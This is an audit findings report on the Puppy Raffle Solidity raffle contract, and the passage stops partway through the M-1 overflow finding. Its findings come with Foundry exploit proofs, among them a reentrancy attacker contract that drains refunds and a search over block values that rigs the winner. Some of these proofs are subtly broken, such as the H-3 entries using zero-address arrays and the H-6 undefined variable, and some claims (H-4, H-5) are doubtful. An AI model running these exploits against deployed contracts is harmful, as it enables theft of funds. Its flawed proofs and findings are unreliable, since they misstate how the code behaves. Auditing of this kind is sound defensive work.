# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle – Protocol Overview

Puppy Raffle is a lightweight on-chain game that marries an ERC-721 NFT with a timed raffle. Players join by calling `enterRaffle()` and paying a fixed entrance fee; each unique address is stored once, preventing duplicates. Until the draw, participants may exit through `refund()` to reclaim their stake and be removed from the roster.

After the predefined `raffleDuration` elapses, the owner triggers `selectWinner()`. A pseudo-random index (derived from block data) selects a winner, who immediately receives the pooled entry fees minus a configurable house cut. That cut is sent to `feeAddress`, while the winner is awarded a freshly minted “Puppy Raffle” NFT. The token’s metadata URI is built on-chain and points to one of several rarity bases (common, rare, legendary), adding collectible flair.

Collected fees can be withdrawn anytime with `withdrawFees()`, and the owner may update the fee recipient via `changeFeeAddress()`. Security and utility stem from OpenZeppelin’s Ownable, ERC721, SafeMath, EnumerableMap/Set, plus on-chain Base64 and Strings helpers for deterministic `tokenURI` generation.
## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::enterRaffle
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. Access Control issue in PuppyRaffle::withdrawFees
[H-5]. Unchecked Return issue in PuppyRaffle::selectWinner
[H-6]. Reentrancy issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-2]. Zero Code issue in PuppyRaffle::getActivePlayerIndex
[M-3]. Pragma issue in PuppyRaffle::NA
[M-4]. MEV issue in PuppyRaffle::selectWinner
[M-5]. MEV issue in PuppyRaffle::enterRaffle
[M-6]. Reentrancy issue in PuppyRaffle::withdrawFees
[M-7]. Integer Overflow/Math issue in PuppyRaffle::enterRaffle
[M-8]. DOS issue in PuppyRaffle::refund
[M-9]. Pragma issue in PuppyRaffle::selectWinner
[M-10]. Access Control issue in PuppyRaffle::NA
[M-11]. Access Control issue in PuppyRaffle::changeFeeAddress
## Low Risk Findings
[L-1]. Unchecked Return issue in PuppyRaffle::refund
[L-2]. Array Limits issue in PuppyRaffle::getActivePlayerIndex
[L-3]. DOS issue in PuppyRaffle::getActivePlayerIndex


### Number of Findings
- H: 6
- M: 11
- L: 3
- I: 0



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function has a nested loop that checks for duplicate players, which has O(n²) complexity. As the number of players increases, the gas cost grows quadratically, potentially making the function unusable due to exceeding block gas limits. This can effectively prevent new players from entering the raffle when the player array becomes too large.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... code ...
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ... code ...
}
```

## Impact
When the number of players grows large enough, the gas cost for checking duplicates will exceed the block gas limit, making it impossible for new players to enter the raffle. This effectively creates a denial of service condition that breaks the core functionality of the contract.

## Proof of Concept
1. Start with an empty raffle
2. Have 100 players enter the raffle
3. When additional players try to enter, the gas cost for the duplicate check becomes prohibitively expensive
4. Eventually, as more players join, the transaction will exceed the block gas limit and fail
5. This prevents new players from entering, effectively breaking the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasLimitTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
    }
    
    function testGasLimitDOS() public {
        // Create a large number of players
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Enter the raffle with initial players
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
        
        // Try to add one more player
        address[] memory newPlayer = new address[](1);
        newPlayer[0] = address(uint160(101));
        
        // Measure gas used
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used for 101st player:", gasUsed);
        
        // Add more players to demonstrate increasing gas costs
        for (uint256 i = 0; i < 50; i++) {
            newPlayer[0] = address(uint160(102 + i));
            gasStart = gasleft();
            puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
            gasUsed = gasStart - gasleft();
            console.log("Gas used for player", 102 + i, ":", gasUsed);
        }
        
        // Eventually this will exceed block gas limit
    }
}

## Suggested Mitigation
Replace the nested loop with a more efficient data structure like a mapping to track player participation. This will reduce the complexity from O(n²) to O(1).

```solidity
// Add this mapping to track active players
mapping(address => bool) public isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!isActivePlayer[player], "PuppyRaffle: Duplicate player");
        
        players.push(player);
        isActivePlayer[player] = true;
    }
    
    emit RaffleEnter(newPlayers);
}

// Update refund function to maintain the mapping
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    isActivePlayer[playerAddress] = false;
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function in PuppyRaffle is vulnerable to reentrancy attacks because it sends ETH to the player before updating the state. An attacker can create a malicious contract that calls back into `refund` during the ETH transfer, allowing them to drain the contract's funds.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee); // Sends ETH before updating state
    
    players[playerIndex] = address(0); // State update happens after ETH transfer
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
An attacker can repeatedly call the refund function during the ETH transfer, draining the contract's funds by claiming multiple refunds for a single entry. This could lead to the theft of all entrance fees in the contract.

## Proof of Concept
1. Attacker creates a malicious contract with a fallback function that calls PuppyRaffle.refund()
2. Attacker enters the raffle using their malicious contract address
3. Attacker calls refund() from their malicious contract
4. During the ETH transfer, the fallback function is triggered, which calls refund() again
5. Since the player's address hasn't been set to address(0) yet, the second refund passes the checks
6. This process repeats until the contract is drained or runs out of gas

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    uint256 attackCount;
    uint256 maxAttacks;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    function attack(uint256 _playerIndex, uint256 _maxAttacks) external {
        playerIndex = _playerIndex;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        
        // Start the reentrancy attack
        puppyRaffle.refund(playerIndex);
    }
    
    // Fallback function to execute the reentrancy attack
    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        attacker = new ReentrancyAttacker(address(puppyRaffle));
        
        // Fund the attacker contract
        vm.deal(address(attacker), 1e18);
    }
    
    function testReentrancyAttack() public {
        // Enter the raffle with the attacker contract
        address[] memory players = new address[](1);
        players[0] = address(attacker);
        
        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Check initial balances
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialContractBalance = address(puppyRaffle).balance;
        
        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Initial contract balance:", initialContractBalance);
        
        // Get the attacker's index
        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        
        // Execute the attack (3 reentrancy loops)
        attacker.attack(attackerIndex, 3);
        
        // Check final balances
        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 finalContractBalance = address(puppyRaffle).balance;
        
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final contract balance:", finalContractBalance);
        
        // Attacker should have received multiple refunds
        assertGt(finalAttackerBalance, initialAttackerBalance + entranceFee);
        
        // Withdraw the stolen funds
        attacker.withdraw();
    }
}

## Suggested Mitigation
Implement the checks-effects-interactions pattern by updating the state before making external calls. Also, consider adding a reentrancy guard.

```solidity
// Add a reentrancy guard
bool private locked;

modifier nonReentrant() {
    require(!locked, "No reentrancy");
    locked = true;
    _;
    locked = false;
}

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call
    players[playerIndex] = address(0);
    
    // External call after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses weak randomness sources that can be manipulated by miners or validators. It relies on `block.timestamp`, `block.difficulty`, and `msg.sender` to generate random numbers for winner selection and NFT rarity determination.

```solidity
function selectWinner() external {
    // ... code ...
    
    // Selecting winner
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // ... code ...
    
    // Selecting rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    // ... code ...
}
```

## Impact
Miners or validators can manipulate the block values to influence the winner selection and NFT rarity. This allows them to potentially make themselves the winner or ensure a specific rarity for the NFT. This undermines the fairness of the raffle and could lead to loss of user trust and funds.

## Proof of Concept
1. A miner who is also a participant in the raffle can manipulate the block.timestamp and block.difficulty
2. They can simulate different values until they find one that makes them the winner
3. They can then include these values when mining the block containing the selectWinner transaction
4. Similarly, they can manipulate the rarity of the NFT to ensure they get a legendary NFT
5. This gives them an unfair advantage over other participants

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessExploitTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address attacker = address(0x1337);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund the attacker
        vm.deal(attacker, 10e18);
        
        // Add some players to the raffle
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = attacker; // Attacker is one of the players
        
        vm.prank(address(0x1));
        vm.deal(address(0x1), entranceFee);
        puppyRaffle.enterRaffle{value: entranceFee}(new address[](1));
        
        vm.prank(address(0x2));
        vm.deal(address(0x2), entranceFee);
        puppyRaffle.enterRaffle{value: entranceFee}(new address[](1));
        
        vm.prank(address(0x3));
        vm.deal(address(0x3), entranceFee);
        puppyRaffle.enterRaffle{value: entranceFee}(new address[](1));
        
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: entranceFee}(new address[](1));
        
        // Fast forward to end the raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testRandomnessManipulation() public {
        // Attacker can manipulate block values to influence the winner
        
        // Try different timestamps and difficulties until attacker wins
        uint256 originalTimestamp = block.timestamp;
        uint256 originalDifficulty = block.difficulty;
        
        bool attackerWon = false;
        uint256 winningTimestamp;
        uint256 winningDifficulty;
        
        // Simulate the attacker trying different block values
        for (uint256 i = 0; i < 100; i++) {
            // Manipulate block values
            vm.warp(originalTimestamp + i);
            vm.difficulty(originalDifficulty + i);
            
            // Calculate the winner index with these values
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;
            
            if (winnerIndex == 3) { // Index 3 is the attacker
                attackerWon = true;
                winningTimestamp = block.timestamp;
                winningDifficulty = block.difficulty;
                break;
            }
        }
        
        // Assert that the attacker found values that make them win
        assertTrue(attackerWon, "Attacker couldn't find winning block values");
        
        // Set the winning block values
        vm.warp(winningTimestamp);
        vm.difficulty(winningDifficulty);
        
        // Attacker calls selectWinner with these manipulated values
        vm.prank(attacker);
        puppyRaffle.selectWinner();
        
        // Verify the attacker won
        assertEq(puppyRaffle.previousWinner(), attacker, "Attacker didn't win despite manipulation");
    }
}

## Suggested Mitigation
Use a secure randomness source such as Chainlink VRF (Verifiable Random Function) to generate unpredictable and unmanipulable random numbers.

```solidity
// Import Chainlink VRF contracts
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

// Update contract to inherit from VRFConsumerBase
contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    address public pendingWinner;
    
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration,
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash,
        uint256 _fee
    ) 
        ERC721("Puppy Raffle", "PR")
        VRFConsumerBase(_vrfCoordinator, _linkToken)
    {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;
        keyHash = _keyHash;
        fee = _fee;
        
        // ... rest of constructor ...
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Request randomness from Chainlink VRF
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK to pay fee");
        requestRandomness(keyHash, fee);
    }
    
    // Callback function called by VRF Coordinator
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        
        // Select winner using the random number
        uint256 winnerIndex = randomResult % players.length;
        address winner = players[winnerIndex];
        pendingWinner = winner;
        
        // Determine rarity using the random number
        uint256 rarity = (randomResult >> 128) % 100;
        
        // Complete the winner selection process
        finalizeWinner(winner, rarity);
    }
    
    function finalizeWinner(address winner, uint256 rarity) internal {
        // ... rest of winner selection logic ...
    }
}
```

## [H-4]. Access Control issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function in PuppyRaffle has a balance validation check that can be bypassed, allowing fees to be withdrawn even when there are active players in the raffle. The function checks if the contract's balance equals `totalFees`, but this can be manipulated by sending ETH directly to the contract.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
An attacker can force the withdrawal of fees even when a raffle is in progress by sending ETH directly to the contract to make its balance match the totalFees. This could disrupt the raffle by removing funds needed for prizes, potentially causing the selectWinner function to fail when trying to send the prize pool to the winner.

## Proof of Concept
1. A raffle is in progress with players who have paid entrance fees
2. The contract balance consists of both player entrance fees and accumulated fees from previous raffles
3. An attacker calculates the difference between the contract balance and totalFees
4. The attacker sends this exact amount of ETH directly to the contract address
5. Now the contract balance equals totalFees, bypassing the check in withdrawFees
6. The attacker calls withdrawFees, draining the accumulated fees
7. When selectWinner is called, there may not be enough ETH to pay the winner

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawFeesExploitTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address attacker = address(0x1337);
    address feeAddress = address(0xFEE);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
        
        // Fund the attacker
        vm.deal(attacker, 10e18);
        
        // Add some players to the raffle
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
            vm.deal(players[i], entranceFee);
            
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // Fast forward and end a previous raffle to accumulate some fees
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        // Start a new raffle with players
        vm.warp(block.timestamp + 1);
        for (uint256 i = 0; i < 4; i++) {
            address player = address(uint160(i + 100));
            vm.deal(player, entranceFee);
            
            vm.prank(player);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = player;
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
    }
    
    function testWithdrawFeesExploit() public {
        // Check initial state
        uint256 initialContractBalance = address(puppyRaffle).balance;
        uint256 initialTotalFees = puppyRaffle.totalFees();
        
        console.log("Initial contract balance:", initialContractBalance);
        console.log("Initial totalFees:", initialTotalFees);
        
        // Verify that normally withdrawFees would fail because there are active players
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Calculate how much ETH to send to make contract balance equal totalFees
        uint256 amountToSend = initialTotalFees > initialContractBalance ? 
                               initialTotalFees - initialContractBalance : 
                               0;
                               
        if (amountToSend > 0) {
            // Send ETH directly to the contract to make balance = totalFees
            vm.prank(attacker);
            (bool sent, ) = address(puppyRaffle).call{value: amountToSend}("");
            require(sent, "Failed to send ETH");
        } else {
            // If totalFees < contract balance, we need a different approach
            // This would involve manipulating totalFees instead
            console.log("Contract balance already exceeds totalFees, different exploit needed");
            return;
        }
        
        // Verify contract balance now equals totalFees
        assertEq(address(puppyRaffle).balance, uint256(puppyRaffle.totalFees()), 
                "Contract balance should equal totalFees");
        
        // Now withdrawFees should succeed even though there are active players
        puppyRaffle.withdrawFees();
        
        // Verify fees were withdrawn
        assertEq(puppyRaffle.totalFees(), 0, "totalFees should be reset to 0");
        assertEq(address(feeAddress).balance, initialTotalFees, "Fee address should receive the fees");
        
        // The contract now has less ETH than needed to pay out the prize pool
        console.log("Remaining contract balance:", address(puppyRaffle).balance);
        console.log("Required for current players prize pool:", 4 * entranceFee * 80 / 100);
    }
}

## Suggested Mitigation
Instead of relying on the contract balance, track active raffle funds separately from fees. Implement a more robust accounting system that doesn't depend on the contract's balance matching a specific value.

```solidity
// Add a variable to track active raffle funds
uint256 public activeRaffleFunds;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // Update active raffle funds
    activeRaffleFunds += msg.value;
    
    // ... rest of the function ...
}

function refund(uint256 playerIndex) public {
    // ... existing code ...
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Update active raffle funds
    activeRaffleFunds -= entranceFee;
    
    // ... rest of the function ...
}

function selectWinner() external {
    // ... existing code ...
    
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    totalFees += fee;
    
    // Update active raffle funds
    activeRaffleFunds = 0;
    
    // ... rest of the function ...
}

function withdrawFees() external {
    // Check that there are no active raffle funds instead of checking balance
    require(activeRaffleFunds == 0, "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [H-5]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in PuppyRaffle does not properly handle the case where the winner's address is unable to receive ETH. If the winner is a contract without a payable fallback or receive function, or if the transfer fails for any other reason, the entire transaction will revert and the raffle will be stuck.

```solidity
function selectWinner() external {
    // ... code ...
    
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    _safeMint(winner, tokenId);
}
```

## Impact
If the winner cannot receive ETH, the raffle will be permanently stuck in a state where no one can claim the prize or start a new raffle. This could lead to locked funds in the contract and a complete breakdown of the raffle functionality.

## Proof of Concept
1. A raffle is conducted with several participants
2. One of the participants is a contract without a payable fallback or receive function
3. This contract is selected as the winner
4. When selectWinner is called, the ETH transfer to the winner fails
5. The entire transaction reverts due to the require statement
6. The raffle is now stuck, as any future calls to selectWinner will also fail

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// A contract that cannot receive ETH
contract NonPayableWinner {
    // No receive or fallback function
    
    function enterRaffle(address puppyRaffleAddress) external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        
        PuppyRaffle(puppyRaffleAddress).enterRaffle{value: msg.value}(players);
    }
}

contract UncheckedReturnTest is Test {
    PuppyRaffle puppyRaffle;
    NonPayableWinner nonPayableWinner;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        nonPayableWinner = new NonPayableWinner();
        vm.deal(address(nonPayableWinner), entranceFee);
        
        // Add some regular players
        address[] memory players = new address[](3);
        for (uint256 i = 0; i < 3; i++) {
            players[i] = address(uint160(i + 1));
            vm.deal(players[i], entranceFee);
            
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // Add the non-payable contract as a player
        nonPayableWinner.enterRaffle{value: entranceFee}(address(puppyRaffle));
        
        // Fast forward to end the raffle
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testRaffleStuckWithNonPayableWinner() public {
        // Rig the random number generation to make the non-payable contract win
        // We'll do this by manipulating the block values until the contract wins
        
        bool contractWouldWin = false;
        uint256 winningTimestamp = block.timestamp;
        uint256 winningDifficulty = block.difficulty;
        
        for (uint256 i = 0; i < 100; i++) {
            vm.warp(block.timestamp + i);
            vm.difficulty(block.difficulty + i);
            
            // Calculate winner with these parameters
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
            
            if (winnerIndex == 3) { // Index 3 is the non-payable contract
                contractWouldWin = true;
                winningTimestamp = block.timestamp;
                winningDifficulty = block.difficulty;
                break;
            }
        }
        
        if (contractWouldWin) {
            // Set the winning parameters
            vm.warp(winningTimestamp);
            vm.difficulty(winningDifficulty);
            
            // Try to select winner - should revert
            vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
            puppyRaffle.selectWinner();
            
            console.log("Raffle is stuck because the winner cannot receive ETH");
            
            // Demonstrate that we cannot start a new raffle
            address[] memory newPlayers = new address[](1);
            newPlayers[0] = address(0x123);
            vm.deal(address(0x123), entranceFee);
            
            vm.prank(address(0x123));
            vm.expectRevert(); // Any new entry would revert due to duplicate check
            puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);
            
            console.log("Cannot enter a new raffle because the previous one is stuck");
        } else {
            console.log("Could not find parameters to make the non-payable contract win");
        }
    }
}

## Suggested Mitigation
Implement a pull-over-push pattern for prize distribution. Instead of automatically sending ETH to the winner, store the winner's information and allow them to claim their prize later. This way, if a winner cannot receive ETH, it doesn't block the entire raffle process.

```solidity
// Add state variables to track prizes
mapping(address => uint256) public pendingPrizes;
address public currentWinner;
bool public raffleActive;

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    require(raffleActive, "PuppyRaffle: Raffle not active");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    totalFees = totalFees + uint64(fee);
    
    // Store the prize for later claiming instead of sending immediately
    pendingPrizes[winner] += prizePool;
    currentWinner = winner;
    
    // Mint the NFT
    uint256 tokenId = totalSupply();
    // ... rarity determination code ...
    _safeMint(winner, tokenId);
    
    // Reset for next raffle
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    raffleActive = false;
}

// Add a function for winners to claim their prizes
function claimPrize() external {
    uint256 prize = pendingPrizes[msg.sender];
    require(prize > 0, "PuppyRaffle: No prize to claim");
    
    // Reset prize before sending to prevent reentrancy
    pendingPrizes[msg.sender] = 0;
    
    // Send the prize
    (bool success, ) = msg.sender.call{value: prize}("");
    require(success, "PuppyRaffle: Failed to send prize");
}

// Add a function to start a new raffle
function startNewRaffle() external {
    require(!raffleActive, "PuppyRaffle: Raffle already active");
    raffleActive = true;
    raffleStartTime = block.timestamp;
}
```

## [H-6]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The selectWinner function contains a reentrancy vulnerability when sending the prize pool to the winner. The vulnerable code executes an external call before updating state:

(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

If the winner is a malicious contract, it can re-enter selectWinner during the call and potentially drain funds or manipulate the raffle state.

## Impact
A malicious winner contract could potentially re-enter the function during prize distribution, leading to unexpected behavior, potential fund drainage, or state manipulation before the raffle is properly concluded.

## Proof of Concept
1. Attacker deploys a malicious contract that implements a fallback function
2. The malicious contract enters the raffle as a player
3. When selectWinner is called and the malicious contract is selected as winner
4. During the prize transfer, the malicious contract's fallback function is triggered
5. The fallback function calls selectWinner again before the first call completes
6. This can lead to unexpected state or multiple prize distributions

## Proof of Code
contract MaliciousWinner {
    PuppyRaffle puppyRaffle;
    bool public attacked;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    receive() external payable {
        if (!attacked && address(puppyRaffle).balance > 0) {
            attacked = true;
            // Re-enter during prize distribution
            puppyRaffle.selectWinner();
        }
    }
}

function testReentrancyAttack() public {
    MaliciousWinner attacker = new MaliciousWinner(address(puppyRaffle));
    
    address[] memory players = new address[](4);
    players[0] = address(attacker);
    players[1] = address(0x2);
    players[2] = address(0x3);
    players[3] = address(0x4);
    
    vm.deal(address(this), 4 ether);
    puppyRaffle.enterRaffle{value: 4 ether}(players);
    
    vm.warp(block.timestamp + raffleEntranceDuration + 1);
    puppyRaffle.selectWinner();
    
    assertTrue(attacker.attacked());
}

## Suggested Mitigation
Implement the checks-effects-interactions pattern by updating all state before external calls, and consider using OpenZeppelin's ReentrancyGuard:

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function selectWinner() external nonReentrant {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Calculate values
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        
        // Update state BEFORE external calls
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        totalFees = totalFees + uint64(fee);
        
        // Mint NFT
        _safeMint(winner, tokenId);
        
        // External call last
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
    }
}



# Medium Risk Findings

## [M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in PuppyRaffle has an integer overflow vulnerability in the `totalFees` calculation. The `totalFees` variable is a uint64, but it's incremented by a uint256 value that could exceed the maximum value of uint64.

```solidity
function selectWinner() external {
    // ... code ...
    
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    totalFees = totalFees + uint64(fee); // Potential overflow here
    
    // ... code ...
}
```

## Impact
If the fee calculation results in a value larger than what can be stored in a uint64 (2^64 - 1), the totalFees variable will overflow, resulting in a much smaller value being stored. This could lead to a significant loss of funds when fees are withdrawn, as the contract will think it has fewer fees than it actually collected.

## Proof of Concept
1. Set up a raffle with a high entrance fee (e.g., 10 ETH)
2. Have many players enter the raffle (e.g., 1000 players)
3. When selectWinner is called, the fee would be calculated as: 1000 * 10 ETH * 20% = 2000 ETH
4. If totalFees is already high, adding 2000 ETH worth of wei could exceed uint64's max value
5. This would cause totalFees to wrap around to a much smaller value
6. When withdrawFees is called, only this smaller amount would be withdrawn

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18; // 1 ETH
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
    }
    
    function testTotalFeesOverflow() public {
        // Create a scenario where totalFees would overflow
        
        // First, we need to manipulate the totalFees to be close to the max uint64 value
        // For demonstration, we'll set it directly (in a real scenario, this would happen over multiple raffles)
        uint64 maxUint64 = type(uint64).max;
        uint64 initialTotalFees = maxUint64 - 1e18; // Just below the max
        
        // Set the totalFees using vm.store
        bytes32 totalFeesSlot = bytes32(uint256(5)); // Slot of totalFees variable (may need adjustment)
